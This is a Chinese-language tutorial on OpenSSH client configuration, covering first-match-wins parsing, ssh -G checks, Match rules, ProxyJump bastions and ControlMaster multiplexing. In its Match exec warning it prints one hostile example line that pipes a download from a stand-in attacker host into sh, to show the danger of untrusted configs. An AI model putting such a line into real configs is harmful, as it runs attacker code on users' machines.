---
title: "SSH 客戶端設定檔"
desc: "~/.ssh/config 的第一個匹配值勝出、ssh -G 驗證、ProxyJump 跳板與 ControlMaster 連線複用"
aliases: [ssh config, ssh_config, ProxyJump, ControlMaster, ssh -G, 跳板機, bastion]
tags: [群組/Linux, 服務/ssh, 主題/遠端, 主題/設定檔]
category: SSH與遠端管理
difficulty: 進階
status: 完成
distro: [ubuntu, rhel]
prerequisites: ["[[02-SSH-金鑰認證與ssh-agent]]", "[[01-SSH-原理與第一次連線]]"]
updated: 2026-08-28
---

# SSH 客戶端設定檔

> [!abstract] 這篇你會學到
> - **★★★★★ ssh_config 是「第一個出現的值勝出」** —— `Host *` 放錯位置會讓整份檔案的行為
>   跟你想的完全相反，本篇用一個真實可重現的例子證明給你看
> - **★★★★ `ssh -G <別名>` 是唯一的真相來源** —— 改完 config 先跑它、再連線，
>   從此不用「連連看猜猜看」
> - 用 **ProxyJump** 一行連進三層網段的內網機器，**★★★★ 而且不用把私鑰放到跳板機上**
> - 用 **ControlMaster 連線複用**讓第二次連線與 `scp` / `rsync` 快到瞬間完成，
>   **★★★ 並學會辨識「舊 socket 還活著所以改了 config 卻毫無反應」**
> - 用 `Include ~/.ssh/config.d/*.conf` 把主機清單版控起來交接給同仁，
>   **★★★ 同時知道哪些欄位不能進公開 repo**
> - 寫出一支 `ssh-config-check` 驗證腳本，讓「設定改壞把自己鎖在外面」變成不可能發生

## 前置知識

- [[01-SSH-原理與第一次連線]] —— 主機金鑰驗證、`known_hosts` 的意義（本篇的 `StrictHostKeyChecking` 建立在這上面）
- [[02-SSH-金鑰認證與ssh-agent]] —— 金鑰產生、`ssh-agent`、`ssh-add`（本篇只講「怎麼在 config 裡指定金鑰」，不重講產生流程）
- [[08-檔案權限與擁有者]] —— `chmod 600` 的意義；本篇的權限檢查靠這個
- 會用文字編輯器改檔案、看得懂 `man` 頁

---

## 觀念說明

### 這份檔案到底解決什麼問題

```
★★ 沒有 ~/.ssh/config 的日常（機關內網三層架構）

  $ ssh -i ~/.ssh/id_ed25519_prod -p 22022 opsadmin@203.0.113.10
  # ★ 先連上跳板機……然後在跳板機上再打一次

  bastion$ ssh -i ~/.ssh/id_ed25519_prod -p 2222 deploy@10.10.20.11
                ^^^^^^^^^^^^^^^^^^^^^^^^
                ★★★★ 這代表【私鑰被複製到跳板機上了】
                     → 跳板機被攻破 = 內網所有機器一起淪陷

  ★★ 每天打 12 次、每次都要查筆記本上的 IP、
     新同仁到職要口頭傳授一小時、離職時沒人知道他手上有哪幾把鑰匙


★★★★ 有 ~/.ssh/config 之後

  $ ssh web01
  # ★ 就這樣。自動走跳板、自動用對的金鑰、自動用對的 port、
  #   ★★★★ 而且私鑰【從頭到尾只存在你的筆電上】

  ★★★ 而且這份檔案可以進 git、可以 code review、可以交接
```

一句話：**`~/.ssh/config` 是把「維運知識」從腦袋跟便利貼搬到一份可版控檔案的地方。**
它不只是省打字，它是**資產清冊**與**交接文件**。

### ★★★★★ 最重要的一件事：第一個匹配值勝出

這是本篇唯一一個**你不知道就一定會出事**的規則。`man 5 ssh_config` 開宗明義：

```text
Unless noted otherwise, for each parameter, the first obtained value will be used.

Since the first obtained value for each parameter is used, more host-specific
declarations should be given near the beginning of the file, and general
defaults at the end.
```

翻成人話：

```
★★★★★ ssh_config 的解析模型

  ssh 從上往下讀整份檔案，把【所有】符合的 Host / Match 區塊都套用一遍，
  但是 ——

    ✗ 【不是】後面的蓋掉前面的        ← ★★★★★ 大多數設定檔是這樣（Nginx、
                                          sshd_config、php.ini、systemd drop-in）
    ✓ 【是】某個參數第一次被設定之後，就【鎖死】，後面再寫都無效

  所以：
    ★★★★★ 「Host * 的共用設定一定要放在檔案的【最後面】」
    ★★★★  「越specific 的 Host 越要放前面」

  ★★★ 記憶法：把它想成「先搶先贏」，不是「後來居上」。
      或者想成防火牆規則（第一條 match 就結束）而不是 CSS。
```

### ★★★★★ 現場重現：Host * 放錯位置

這不是理論。以下兩份 config **內容完全一樣，只差區塊順序**：

```bash
# ★★★★★ 錯誤版本：Host * 寫在最前面
cat > /tmp/bad.conf <<'EOF'
Host *
    User deploy

Host web01
    HostName 10.10.20.11
    User ubuntu
    Port 2222
EOF

ssh -F /tmp/bad.conf -G web01 | grep -E '^(user|hostname|port) '
```

預期輸出：

```text
user deploy          # ★★★★★ 不是 ubuntu！Host * 先設定了 User，web01 的 User 完全被忽略
hostname 10.10.20.11 # ★★ HostName 只有 web01 設，所以生效
port 2222            # ★★ Port 也只有 web01 設，所以生效
```

```bash
# ★★★★ 正確版本：Host * 收尾
cat > /tmp/good.conf <<'EOF'
Host web01
    HostName 10.10.20.11
    User ubuntu
    Port 2222

Host *
    User deploy
EOF

ssh -F /tmp/good.conf -G web01 | grep -E '^(user|hostname|port) '
```

預期輸出：

```text
user ubuntu          # ★★★★ 這次對了
hostname 10.10.20.11
port 2222
```

> [!danger] 這個錯誤在機關環境的真實後果 ★★★★★
> ```
> 常見情境：資深同仁在 config 最上面加了
>
>   Host *
>       User root                    ← ★★★★ 「反正我都用 root」
>       StrictHostKeyChecking no     ← ★★★★★ 見安全性章節
>
> 然後新同仁在下面加自己的機器：
>
>   Host web01
>       User deploy                  ← ★★★★★ 【永遠不會生效】
>
> 結果：
>   ① ★★★★ 全部的 ssh 都用 root 連 → 稽核軌跡全部是 root，
>      機關資安稽核「特權帳號使用紀錄」這一項直接掛掉
>   ② ★★★ 新同仁 debug 兩小時，因為「我明明寫了 User deploy」
>   ③ ★★★★ 更慘的是 IdentityFile —— 如果 Host * 先指定了一把金鑰，
>      所有機器都會拿那把去試，log 裡全是認證失敗
> ```

### ★★★★ 設定的三層優先序

```
★★★★ ssh 讀設定的順序（先讀到的贏）

  ┌────────────────────────────────────────────────┐
  │ ① 命令列  ssh -o User=root / -p 2222 / -i key  │ ← ★★★★ 最高，永遠贏
  ├────────────────────────────────────────────────┤
  │ ② ~/.ssh/config          （你自己的）           │ ← ★★★ 日常戰場
  ├────────────────────────────────────────────────┤
  │ ③ /etc/ssh/ssh_config    （全機器共用）         │ ← ★★ 通常別動
  │    └ Debian/Ubuntu 在最前面 Include            │
  │       /etc/ssh/ssh_config.d/*.conf             │
  └────────────────────────────────────────────────┘

  ★★★★ 因為「先讀到的贏」，所以 ③ 幾乎不可能蓋掉 ②
        —— 但反過來，如果 /etc/ssh/ssh_config.d/ 裡有東西
        （★★★ Ubuntu 的 openssh-client 套件、企業 MDM、TWGCB 基準腳本常放這），
        它會【比 /etc/ssh/ssh_config 早讀到】。
        排查「明明沒設卻生效」的問題，記得看這個目錄。

  ★★★ 唯一的例外：ssh -F <檔案> 會【完全取代】② 與 ③，只讀你指定的那一份。
      → 這是測試新設定最安全的方式（見下方「不要把自己鎖在外面」）
```

```bash
# ★★ 確認系統層有沒有偷偷加東西
ls -l /etc/ssh/ssh_config.d/ 2>/dev/null
```

預期輸出（Ubuntu 24.04 / 26.04 典型）：

```text
total 0
# ★★ 空的最好。如果有 .conf 檔，一定要打開看內容
```

---

## 基礎設定

### 建立檔案與 ★★★★ 權限

```bash
mkdir -p ~/.ssh
chmod 700 ~/.ssh
touch ~/.ssh/config
chmod 600 ~/.ssh/config          # ★★★★ 這行不能少
ls -l ~/.ssh/config
```

預期輸出：

```text
-rw------- 1 opsadmin opsadmin 0 Aug 28 09:12 /home/opsadmin/.ssh/config
#  ^^^^^^^ ★★★★ 必須是 600（或 644 也可，重點是【group / other 不可寫】）
```

> [!warning] 權限不對時 ssh 會直接罷工 ★★★★
> ```text
> Bad owner or permissions on /home/opsadmin/.ssh/config
> ```
> ```
> ★★★★ 這是【硬性拒絕】，不是警告 —— ssh 直接退出，連都不連。
>
> 觸發條件（滿足任一）：
>   ① ★★★ 檔案的 group 或 other 有【寫入】權限（例如 664、666、777）
>   ② ★★★★ 檔案的擁有者不是你（例如用 sudo 編輯後 owner 變 root）
>
> ★★ 注意：644 是【可以】的（other 只能讀）。真正致命的是「可寫」與「owner 錯」。
> ★★★ 但實務上一律用 600 —— 因為 config 裡常有跳板機外網 IP 與帳號，
>     這些對攻擊者是很好的偵察情報，不該讓同機器的其他使用者讀到。
>
> 修法：
>   $ sudo chown "$USER:$USER" ~/.ssh/config
>   $ chmod 600 ~/.ssh/config
> ```

### 最小可用的一份 config

```bash
cat > ~/.ssh/config <<'EOF'
# ---- 特定主機（越specific 越前面）----------------------------
Host web01
    HostName 10.10.20.11
    User deploy
    Port 2222
    IdentityFile ~/.ssh/id_ed25519_prod
    IdentitiesOnly yes

# ---- 共用預設（★★★★ 一定放最後）-----------------------------
Host *
    AddKeysToAgent yes
    ServerAliveInterval 30
    ServerAliveCountMax 3
EOF
chmod 600 ~/.ssh/config
```

```bash
# ★★★★ 改完【先驗證再連線】，這是本篇最重要的肌肉記憶
ssh -G web01 | grep -E '^(hostname|user|port|identityfile|identitiesonly|serveralive)'
```

預期輸出：

```text
user deploy
hostname 10.10.20.11
port 2222
identitiesonly yes
serveralivecountmax 3
serveraliveinterval 30
identityfile ~/.ssh/id_ed25519_prod
```

```bash
# ★★ 確認之後才真的連
ssh web01
```

### ★★★★ `ssh -G` —— 所有 config 問題的第一動作

`ssh -G <目的地>` 會**套用完 Host 與 Match 區塊之後，把最終生效的完整設定印出來然後退出**
（不會連線、不會動到任何東西，**★★★ 完全安全，可以隨便跑**）。

```bash
ssh -G web01 | head -20
```

預期輸出（節錄）：

```text
host web01                       # ★★★ 你在命令列打的別名（originalhost）
user deploy
hostname 10.10.20.11             # ★★★ 真正要連的位址
port 2222
addressfamily any
batchmode no
...
stricthostkeychecking ask        # ★★★★ 預設值，維持它
```

```bash
# ★★★ 三個最實用的用法

# ① 只看你關心的四個欄位
ssh -G web01 | awk '$1 ~ /^(hostname|user|port|proxyjump)$/ {print $1"="$2}'

# ② 比較兩台主機的設定差異（★★ 「為什麼 web01 可以 web02 不行」）
diff <(ssh -G web01) <(ssh -G web02)

# ③ ★★★★ 驗證命令列 -o 真的贏過 config
ssh -G -o User=root web01 | grep '^user '
```

`③` 的預期輸出：

```text
user root                        # ★★★★ 命令列贏，證實優先序第一層
```

> [!tip] `ssh -G` 的三個陷阱 ★★★
> ```
> ① ★★★★ 別名打錯不會報錯
>    $ ssh -G nosuchhost | grep -E '^(hostname|user)'
>    user deploy
>    hostname nosuchhost          ← ★★★★ hostname 竟然等於別名本身
>
>    ★★★★ 判斷法則：如果 hostname 跟你打的別名【一模一樣】，
>          代表【沒有任何 Host 區塊匹配到】—— 通常是別名拼錯或大小寫錯。
>          （★★ 除非你本來就打算用 DNS 名稱直連，那才是正常的）
>
> ② ★★ 輸出順序不是你 config 的順序
>    ssh -G 用的是固定的內部排序，不要拿它推論「誰先誰後」。
>    要看解析順序請用 ssh -vvv（見下）。
>
> ③ ★★★ IdentityFile 一定會列出五個「預設候選」
>    identityfile ~/.ssh/id_rsa
>    identityfile ~/.ssh/id_ecdsa
>    ...
>    ★★ 這是 OpenSSH 內建預設，不代表你設錯。
>    ★★★ 設了 IdentitiesOnly yes 之後，這些【還是會印出來】但實際不會被拿去試。
> ```

### ★★★ `ssh -vvv`：看解析的每一步

`ssh -G` 告訴你「結果是什麼」，`ssh -vvv` 告訴你「**為什麼**是這個結果」。

```bash
ssh -vvv -o ConnectTimeout=3 web01 true 2>&1 \
  | grep -E 'Reading configuration|Including file|Applying options'
```

預期輸出：

```text
debug1: Reading configuration data /home/opsadmin/.ssh/config
debug3: /home/opsadmin/.ssh/config line 1: Including file /home/opsadmin/.ssh/config.d/10-bastion.conf depth 0
debug1: Reading configuration data /home/opsadmin/.ssh/config.d/10-bastion.conf
debug1: /home/opsadmin/.ssh/config.d/20-prod.conf line 1: Applying options for web01
debug1: /home/opsadmin/.ssh/config.d/90-defaults.conf line 1: Applying options for *
debug1: Reading configuration data /etc/ssh/ssh_config
```

```
★★★★ 「Applying options for X」這幾行就是答案 ——
     它按【實際套用順序】列出所有匹配到的區塊。
     第一個 Applying 的區塊裡設了什麼，那些參數就定案了。

★★★ 排查「我的設定沒生效」時，看的就是：
     我期望的那個區塊，是不是排在別人後面？
```

### Host 的比對語法

```bash
# ★ 一個區塊可以掛多個別名（空白分隔）
Host web01 web02 web03
    ProxyJump bastion

# ★★ 萬用字元
Host *.internal.gov.tw       # * = 任意長度任意字元
Host web0?                   # ? = 剛好一個字元（web01~web09，不含 web10）
Host 10.10.20.*              # ★★ 可以比對 IP 樣式（★★★ 但比的是【你打的字串】）

# ★★★ ! 排除：「除了 X 以外的」
Host *.gov.tw !legacy.gov.tw
    IdentityFile ~/.ssh/id_ed25519_gov

# ★★★ 排除規則的關鍵：只要命中任一個 ! 樣式，【整個區塊直接跳過】，
#     不管其他樣式有沒有匹配到。
```

> [!warning] Host 比對的是「你打的字」，不是 HostName ★★★★
> ```bash
> Host web01
>     HostName 10.10.20.11
>
> Host 10.10.*                # ★★★★ 這個區塊【不會】對 web01 生效
>     IdentityFile ~/.ssh/id_prod
> ```
> ```
> ★★★★ Host 比對的是 originalhost —— 也就是「你在命令列輸入的那個字串」。
>       你打 `ssh web01`，比對的就是 `web01`，跟它最後解析成什麼 IP 無關。
>
> ★★★ 想用「解析後的 HostName」來比對，必須改用 Match host：
>
>   Match host 10.10.*
>       IdentityFile ~/.ssh/id_prod
>
> ★★★ 而且 Match host 要能生效，前面必須已經有區塊把 HostName 設好，
>     否則 %h 還是那個別名，一樣比不到。
> ```

### 核心設定項一覽

| 設定項 | 作用 | 為什麼你會需要它 |
| --- | --- | --- |
| `HostName` ★★★ | 真正要連的 IP 或 FQDN | 別名跟實際位址脫鉤，換 IP 只改一行 |
| `User` ★★★ | 登入帳號 | **★★★ 機關稽核要求「一人一帳號」，不要用 root** |
| `Port` ★★ | 非標準 port | 搭配 [[04-sshd-伺服器端設定]] 的改 port 政策 |
| `IdentityFile` ★★★ | 指定私鑰 | 一台一把、一環境一把 |
| `IdentitiesOnly yes` ★★★★ | **只用指定的金鑰** | 見下方專門說明 |
| `AddKeysToAgent yes` ★★ | 首次解鎖後自動加入 agent | 一天只輸入一次 passphrase |
| `ForwardAgent no` ★★★★ | **關閉 agent 轉發** | 見安全性章節，預設就是 no，**不要開** |
| `StrictHostKeyChecking` ★★★★ | 主機金鑰驗證政策 | `ask`（預設）/ `accept-new` / **`no`（禁用）** |
| `UserKnownHostsFile` ★★★ | known_hosts 位置 | 拋棄式環境可分檔，**★★★★ 不要指到 /dev/null** |
| `LogLevel` ★★ | 輸出詳細度 | `ERROR` 可壓掉惱人的 banner；除錯時改 `DEBUG3` |
| `ConnectTimeout` ★★★ | 建線逾時（秒） | **腳本裡一定要設**，否則卡死 |
| `BatchMode yes` ★★★ | 不互動、不問密碼 | **腳本裡一定要設**，失敗就直接退出 |
| `RequestTTY` ★★ | 是否配置終端機 | `force` 讓 `ssh host top` 能正常顯示 |
| `SetEnv` ★★ | 傳環境變數過去 | 伺服器端要 `AcceptEnv` 配合 |
| `Compression` ★ | 壓縮傳輸 | **★★ 只在真的很慢的線路才開**，區網開了反而變慢 |
| `HostKeyAlias` ★★★ | known_hosts 用的名字 | 同一台機器有多個 IP／走隧道時避免重複驗證 |

#### ★★★★ `IdentitiesOnly yes` 是必設項

```bash
# ★★★★ 不設它會發生什麼
ssh -vvv web01 2>&1 | grep -E 'Offering|Trying private key'
```

預期輸出（**問題現場**）：

```text
debug1: Offering public key: /home/opsadmin/.ssh/id_rsa RSA SHA256:aaa...
debug1: Offering public key: /home/opsadmin/.ssh/id_ecdsa ECDSA SHA256:bbb...
debug1: Offering public key: /home/opsadmin/.ssh/id_ed25519_gitlab ED25519 SHA256:ccc...
debug1: Offering public key: /home/opsadmin/.ssh/id_ed25519_prod ED25519 SHA256:ddd...
#   ★★★★ 它把 agent 裡【每一把】金鑰都送出去試
```

```
★★★★ 兩個後果：

  ① 【被鎖帳號】sshd 預設 MaxAuthTries 6。
     你的 agent 裡有 8 把鑰匙 → 試到第 6 把就被伺服器踢掉，
     ★★★★ 即使正確的那把是第 7 把 —— 你會看到「Too many authentication failures」
     而且你【百分之百確定金鑰是對的】，這個坑非常難自己想通。

  ② 【資訊外洩】★★★ 你把所有金鑰的【公鑰指紋】送給了對方伺服器。
     對方（可能是不受信任的第三方主機）因此知道你還有哪些身分。

★★★★ 解法就是一行：
    IdentitiesOnly yes      ← 只送 IdentityFile 明確指定的那一把
```

### ★★★★ 絕對不要把自己鎖在外面

本章所有 SSH 篇章共通的鐵律。**客戶端設定改壞的殺傷力比伺服器端小，但一樣會讓你連不進去**
（例如 `ProxyJump` 指到一台不存在的跳板機、`IdentityFile` 指錯路徑）。

```
★★★★ 四道保險（順序就是操作順序）

  ① ★★★★ 【保留一條既有的連線不要關】
     開一個 terminal 連著正式機，整個修改過程都不要動它。
     改壞了還有這條路可以救。
     ★★★ 搭配 [[01-tmux-工作階段管理]]：連線在 tmux 裡，
         就算你的網路斷了工作階段也還在。

  ② ★★★★ 【新設定先寫到另一個檔案，用 -F 測】
     $ ssh -F ~/.ssh/config.new -G web01        # 先看設定對不對
     $ ssh -F ~/.ssh/config.new web01 true      # 再測真的連得上
     ★★★★ -F 完全取代 ~/.ssh/config，測壞了原本那份【動都沒動】

  ③ ★★★ 【用 -o 單點測試】
     $ ssh -o ProxyJump=bastion -o User=deploy 10.10.20.11 true
     確認參數組合可行，才寫進 config

  ④ ★★★ 【備份 + 一行還原】
     $ cp -a ~/.ssh/config ~/.ssh/config.bak.$(date +%F-%H%M)
     出事時：$ cp -a ~/.ssh/config.bak.2026-08-28-0912 ~/.ssh/config


★★★★★ 對照：如果你改的是【伺服器端】的 /etc/ssh/sshd_config，
      多一道非做不可的手續 ——
        $ sudo sshd -t                  # 語法檢查，沒輸出才算過
        $ sudo systemctl reload ssh     # ★★★ reload 不會斷現有連線
      細節見 [[04-sshd-伺服器端設定]]。本篇是客戶端，沒有 sshd -t 的對應物，
      ★★★★ `ssh -G` 就是客戶端的 `sshd -t`。
```

```bash
# ★★★ 客戶端也有「語法檢查」—— 用 -G 就會逼 ssh 完整解析一次
ssh -G web01 >/dev/null && echo "語法 OK" || echo "★★★★ 設定檔有語法錯誤"
```

打錯字時的預期輸出：

```text
/home/opsadmin/.ssh/config: line 4: Bad configuration option: usre
/home/opsadmin/.ssh/config: terminating, 1 bad configuration options
★★★★ 設定檔有語法錯誤
```

```
★★★ 注意這個錯誤是【全域致命】的 ——
    只要 config 有一個打錯的關鍵字，你【所有】的 ssh 指令全部不能用，
    包含 git push（走 ssh）、rsync、scp、Ansible。
    ★★★★ 所以「改完 config 一定要跑一次 ssh -G」不是龜毛，是保命。
```

> [!info]- Rocky / AlmaLinux（RHEL 系）對照
> 客戶端行為與 Ubuntu **完全相同**（同一份 OpenSSH 原始碼），差別在系統層設定：
>
> ```bash
> sudo dnf install -y openssh-clients
> ssh -V
> ```
>
> ```text
> OpenSSH_8.7p1, OpenSSL 3.2.2 4 Jun 2024
> ```
>
> | 差異 | Ubuntu / Debian | Rocky / AlmaLinux |
> | --- | --- | --- |
> | 套件名 ★ | `openssh-client` | `openssh-clients`（有 s） |
> | 系統 include ★★★ | `/etc/ssh/ssh_config.d/*.conf`（**由套件預設加入**） | 同樣有，但預設放的是 `05-redhat.conf` |
> | 加密政策 ★★★★ | 無集中政策 | **`update-crypto-policies`（`/etc/crypto-policies/back-ends/openssh.config`）會覆寫演算法清單** |
> | SELinux ★★★ | 無 | `ssh_home_t` 標籤錯會導致金鑰讀不到 |
>
> ```bash
> # ★★★★ RHEL 系獨有的坑：連舊設備時演算法被系統政策擋掉
> cat /etc/crypto-policies/back-ends/openssh.config | head -5
> sudo update-crypto-policies --show
> ```
> ```text
> DEFAULT
> # ★★★★ 連老舊交換器／IPMI 時可能需要 LEGACY，
> #      但那是【全系統】降級 —— 寧可在該主機的 Host 區塊單獨加
> #      HostKeyAlgorithms +ssh-rsa
> #      PubkeyAcceptedAlgorithms +ssh-rsa
> ```
>
> ```bash
> # ★★★ SELinux 讓 config / 金鑰讀不到時
> ls -Z ~/.ssh/config
> restorecon -Rv ~/.ssh
> ```
> ```text
> unconfined_u:object_r:ssh_home_t:s0 /home/opsadmin/.ssh/config
> ```

---

## 進階設定與調校

### Host 與 Match 的分工

| | `Host` | `Match` |
| --- | --- | --- |
| 比對對象 ★★★★ | **只比 originalhost**（命令列打的字串） | 多種條件（見下表） |
| 語法 | 樣式清單，支援 `*` `?` `!` | 條件關鍵字 + 參數 |
| 何時用 ★★★ | 90% 的情況 | 需要「依實際 hostname／使用者／環境」決定時 |

`Match` 可用的條件（本機 OpenSSH 10.2 實測，`man 5 ssh_config` 為準）：

| 條件 | 意義 | 星級 |
| --- | --- | --- |
| `originalhost` | 命令列打的字串（等同 `Host`） | ★★ |
| `host` | **解析後的 HostName** | ★★★ |
| `user` | 遠端使用者名稱 | ★★ |
| `localuser` | **本機**登入的使用者 | ★★★ |
| `exec "cmd"` | 執行指令，離開碼 0 就算符合 | ★★★★ |
| `tagged <name>` | 前面用 `Tag` 標記過的（**OpenSSH 9.4+**） | ★★★ |
| `final` | **全部解析完之後再跑一輪** | ★★★ |
| `canonical` | 主機名正規化之後才符合 | ★★ |
| `all` | 永遠符合（必須單獨或緊接在 `canonical`／`final` 後） | ★★ |

```bash
# ★★★ Match host：依【解析後的 IP 網段】決定金鑰
cat > /tmp/m.conf <<'EOF'
Host web01
    HostName 10.10.20.11
    User deploy

Match host 10.10.* !host 10.10.99.*
    IdentityFile ~/.ssh/id_ed25519_prod
    IdentitiesOnly yes
EOF
ssh -F /tmp/m.conf -G web01 | grep -E '^(hostname|identitiesonly|identityfile ~)'
```

預期輸出：

```text
hostname 10.10.20.11
identitiesonly yes
identityfile ~/.ssh/id_ed25519_prod    # ★★★ Match host 命中 10.10.*
```

```bash
# ★★★★ Match exec：在辦公室內網時不走跳板，在外面才走
cat > /tmp/e.conf <<'EOF'
Match exec "ip route get 10.10.20.11 2>/dev/null | grep -q ' dev '"
    ProxyJump none

Host web01
    HostName 10.10.20.11
    ProxyJump bastion
EOF
ssh -F /tmp/e.conf -G web01 | grep -E '^proxyjump' || echo "（沒有 proxyjump = 直連）"
```

```
★★★★ Match exec 的三個注意事項：

  ① 它會【每次 ssh 都執行一次那個指令】—— 慢的指令會拖慢每次連線。
     ★★★ 不要在裡面 curl 外部網站。

  ② ★★★★ 它是用 /bin/sh 執行的，而且 ssh 不做任何跳脫。
     指令內容等於「你把 shell 權限交給這份 config」——
     ★★★★★ 所以【絕對不要】把別人給的 config 直接 Include 進來，
           一個 Match exec "curl evil.example.com/x | sh" 就是遠端執行。

  ③ ★★ ProxyJump none 是「明確取消跳板」的寫法，
     因為「第一個值勝出」，你沒辦法「刪掉」已經設定的值，只能先設成 none。
```

```bash
# ★★★ Tag / Match tagged（OpenSSH 9.4+）：用標籤取代一長串主機名
cat > /tmp/t.conf <<'EOF'
Host web01 web02 db01
    Tag prod

Host stg-web01
    Tag staging

Match tagged prod
    User deploy
    IdentityFile ~/.ssh/id_ed25519_prod
    IdentitiesOnly yes
    LogLevel INFO

Match tagged staging
    User devops
    IdentityFile ~/.ssh/id_ed25519_stg
    IdentitiesOnly yes

Host *
    AddKeysToAgent yes
EOF
ssh -F /tmp/t.conf -G web01 | grep -E '^(user|tag|identityfile ~)'
```

預期輸出：

```text
user deploy
tag prod
identityfile ~/.ssh/id_ed25519_prod
```

```
★★★ Tag 的價值：新增一台正式機時只要寫兩行
      Host web09
          Tag prod
    金鑰、帳號、log 等級全部自動套用 —— ★★★ 這是大型主機清單最好維護的寫法。

★★ 相容性：OpenSSH 9.4（2023-08）才有。Ubuntu 22.04（8.9）、RHEL 8/9（8.7）沒有。
   ★★★ 要相容舊環境就退回 Host 樣式命名法（web-prod-01、web-stg-01 + Host *-prod-*）。
```

### ★★★★ ProxyJump：連進內網而不把私鑰交出去

```bash
# 命令列寫法
ssh -J opsadmin@203.0.113.10:22022 deploy@10.10.20.11

# ★★ 多層跳板（DMZ → 內網跳板 → 目標），逗號分隔、由外而內
ssh -J bastion-dmz,bastion-int web01
```

寫進 config 之後：

```bash
Host bastion
    HostName 203.0.113.10
    User opsadmin
    Port 22022
    IdentityFile ~/.ssh/id_ed25519_bastion
    IdentitiesOnly yes

Host web01
    HostName 10.10.20.11
    User deploy
    ProxyJump bastion          # ★★★ 這裡填的是【別名】，所以上面那些設定會自動套用
```

```bash
ssh web01                      # ★★★★ 一行搞定兩跳
```

#### ★★★★ 為什麼跳板機上不需要放你的私鑰

```
★★★★★ 這是 ProxyJump 最重要、也最多人誤解的一點

  【錯誤做法】ssh 到跳板機，再從跳板機 ssh 進去
  ┌──────────┐  ssh   ┌──────────┐  ssh   ┌──────────┐
  │  你的筆電 │───────▶│  跳板機   │───────▶│  web01   │
  └──────────┘        └──────────┘        └──────────┘
                       ▲
                       │ ★★★★★ 私鑰必須複製到這裡
                       │ 跳板機是【對外開放】的機器，最常被攻擊
                       │ 一旦淪陷 → 內網全部機器的鑰匙一起被拿走


  【ProxyJump】兩層加密通道套疊，私鑰只留在筆電
  ┌──────────────────────────────────────────────────────────┐
  │ 你的筆電                                                   │
  │  ┌────────────────────────────────────────────────────┐  │
  │  │ 內層：你 ←──── SSH 加密 ────▶ web01                 │  │  ← ★★★★ 用 id_ed25519_prod
  │  │        （web01 的主機金鑰驗證也在這層做）             │  │      在【筆電上】簽章
  │  └────────────────────────────────────────────────────┘  │
  │             ↓ 內層封包被當成「純資料」塞進外層             │
  │  ┌────────────────────────────────────────────────────┐  │
  │  │ 外層：你 ←──── SSH 加密 ────▶ 跳板機                │  │  ← ★★ 用 id_ed25519_bastion
  │  └────────────────────────────────────────────────────┘  │
  └──────────────────────────────────────────────────────────┘
                        │
                        ▼  外層在跳板機解開
                 ┌──────────────┐
                 │   跳板機      │
                 │              │  ★★★★ 跳板機只看到「一坨加密的 TCP 位元組」
                 │  只做 TCP 轉發 │       它【解不開】內層，
                 │  ssh -W       │       ★★★★★ 也沒有你的任何私鑰
                 └──────────────┘
                        │ 純 TCP
                        ▼
                 ┌──────────────┐
                 │    web01     │
                 └──────────────┘

  ★★★★ 一句話：跳板機是【水管】，不是【中繼站】。
        它轉發加密位元組，不參與認證。
```

```bash
# ★★★ 證明給你自己看：ProxyJump 內部其實就是 ssh -W
ssh -vvv -o ConnectTimeout=3 web01 true 2>&1 | grep 'Executing proxy command'
```

預期輸出：

```text
debug1: Executing proxy command: exec ssh -vvv -W '[10.10.20.11]:22' bastion
#                                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
#  ★★★★ ssh -W host:port 的意思是「把 stdin/stdout 接到遠端的這個 TCP port」
#       跳板機上跑的是這個，不是一個新的 ssh 登入 shell
```

| 寫法 | OpenSSH 版本 | 備註 |
| --- | --- | --- |
| `ProxyJump bastion` ★★★★ | **7.3+**（2016） | 現代寫法，優先使用 |
| `ProxyJump a,b,c` ★★★ | 7.3+ | 多層跳板，由外而內 |
| `ProxyJump none` ★★★ | 7.3+ | 取消繼承來的跳板設定 |
| `ProxyCommand ssh -W %h:%p bastion` ★★ | 5.4+ | **舊版相容寫法**，效果幾乎相同 |
| `ProxyCommand ssh bastion nc %h %p` ★ | 遠古 | **★★★ 需要跳板機裝 nc，且無法優雅關閉，不要用** |

```bash
# ★★ 給老舊環境（例如只有 OpenSSH 6.x 的 RHEL 7 客戶端）
Host web01
    HostName 10.10.20.11
    User deploy
    ProxyCommand ssh -W %h:%p bastion
    #             ★★★ %h = HostName、%p = Port，由 ssh 在執行時替換
```

> [!warning] ProxyJump 的兩個常見誤解 ★★★
> ```
> ① ★★★ 「命令列的 -o 會套用到跳板機」→ 錯
>    $ ssh -o User=root -J bastion web01
>    ★★★ 這個 -o User=root 只作用在【最終目的地 web01】，
>        跳板機的帳號還是從 config 的 Host bastion 區塊來。
>        man 明講：「configuration directives supplied on the command-line
>        generally apply to the destination host and not any specified jump hosts」
>    ★★★ 要設跳板機的參數，就【寫進 config】，或用 -J user@host:port 完整形式。
>
> ② ★★ 「跳板機的 known_hosts 要放在跳板機上」→ 錯
>    ★★★ web01 的主機金鑰驗證是在【你的筆電】上做的，
>        所以 web01 的指紋會寫進【你筆電的】~/.ssh/known_hosts。
>        跳板機上的 known_hosts 跟這件事完全無關。
> ```

### ★★★ ControlMaster：連線複用

第一次連線要做 TCP 交握 + 金鑰交換 + 認證，在有跳板機的情況下這是**兩次**完整流程。
`ControlMaster` 讓後續連線**共用第一條已經建立好的加密通道**。

```bash
mkdir -p ~/.ssh/cm
chmod 700 ~/.ssh/cm            # ★★★ 目錄權限要嚴，socket 被別人存取等於連線被劫持

# 寫在 Host * 區塊（★★★★ 檔案最後面）
Host *
    ControlMaster auto
    ControlPath ~/.ssh/cm/%C
    ControlPersist 10m
```

```bash
# ★★★ 實測差異
time ssh web01 true      # 第一次：完整建線
time ssh web01 true      # 第二次：複用
```

預期輸出：

```text
real    0m1.842s          # ★★ 第一次（含跳板機那一跳）
...
real    0m0.038s          # ★★★★ 第二次，快了 45 倍
```

```bash
# ★★★ 確認 master 在跑
ssh -O check web01
```

預期輸出：

```text
Master running (pid=48213)
```

```bash
# ★★★★ 收工／改完 config 之後：把 master 關掉
ssh -O exit web01
```

預期輸出：

```text
Exit request sent.
```

沒有 master 在跑時：

```text
Control socket connect(/home/opsadmin/.ssh/cm/870b88d7...): No such file or directory
```

| `ssh -O` 子指令 | 作用 | 星級 |
| --- | --- | --- |
| `check` | 確認 master 還在不在 | ★★★ |
| `exit` | **關閉 master 與所有複用連線** | ★★★★ |
| `stop` | 停止接受新的複用，但現有工作階段保留 | ★★ |
| `forward` / `cancel` | 對已建立的連線動態增減埠轉發（見 [[05-SSH-隧道與埠轉發]]） | ★★ |

